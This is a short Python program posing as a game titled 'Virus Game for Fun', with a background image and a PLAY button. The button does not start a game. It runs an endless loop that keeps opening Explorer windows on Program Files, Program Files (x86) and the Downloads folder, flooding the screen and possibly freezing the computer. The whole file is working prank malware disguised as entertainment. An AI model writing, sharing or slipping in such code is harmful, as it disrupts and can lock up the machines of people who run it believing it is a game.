from customtkinter import CTk, CTkLabel,CTkButton
from PIL import Image, ImageTk
import os
import random

app = CTk()
app.geometry("600x400")
app.iconbitmap("ninja.ico")
app.title("Virus Game for Fun")
img = Image.open("R.png")
img = img.resize((600, 400), Image.ANTIALIAS)
photo_img = ImageTk.PhotoImage(img)
image_label = CTkLabel(app, image=photo_img,text=" ",font=(None, 18))
image_label.place(x=0,y=0)


def open_file():
    while True:
        numbers = [1, 2, 3]
        random_number = random.choice(numbers)

        if random_number == 1:
            os.startfile(r"C:\Program Files (x86)")
        elif random_number == 2:
            os.startfile(r"C:\Users\User\Downloads")
        elif random_number == 3:
            os.startfile(r"C:\Program Files")

button = CTkButton(image_label, text="PLAY", command=open_file, width=18,fg_color="red",font=("Helvetica", 18,"bold","roman"))
button.place(x=270,y=350)

app.mainloop()





